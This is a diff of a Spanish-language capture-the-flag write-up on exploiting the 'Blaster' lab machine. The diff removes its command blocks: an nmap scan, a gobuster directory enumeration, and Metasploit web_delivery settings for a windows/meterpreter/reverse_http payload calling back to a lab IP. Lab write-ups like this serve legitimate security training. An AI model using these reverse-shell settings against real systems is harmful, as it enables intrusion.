@@ -3,10 +3,6 @@
 1. Reconocimiento Inicial
 El primer paso en la explotación de la máquina Blaster es realizar un escaneo con nmap para identificar los puertos abiertos.
 
-Comando nmap:
-```bash
-nmap -Pn 10.10.54.54
-```
 ![](Imagenes/1.png)
 
 2. Acceso a la página web
@@ -19,10 +15,6 @@ El sitio web tiene una interfaz de Internet Information Services (IIS) con múlt
 3. Enumeración de Directorios con Gobuster
 El siguiente paso es enumerar directorios en la página web utilizando Gobuster.
 
-Comando:
-```bash
-gobuster dir -u http://10.10.54.54/ -w /usr/share/dirb/wordlists/big.txt
-```
 
 ![](Imagenes/3.png)
 
@@ -94,19 +86,11 @@ Nos abrira la cmd ya con todos los privilegos de Windows, como vemos en la image
 
 Comando en Metasploit:
 
-```bash
-use exploit/multi/script/web_delivery
-```
+
 ![](Imagenes/19.png)
 
 10. Configuración del Payload Utilicé el exploit adecuado para la vulnerabilidad y configuré las opciones necesarias en Metasploit:
 
-```bash
-set target 2
-set lport 80
-set lhost 10.21.128.154
-set payload windows/meterpreter/reverse_http
-```
 ![](Imagenes/20.png)
 
 11. Ejecución del Exploit Una vez configurado todo, ejecuté el payload y esperé a que se estableciera una conexión reversa.
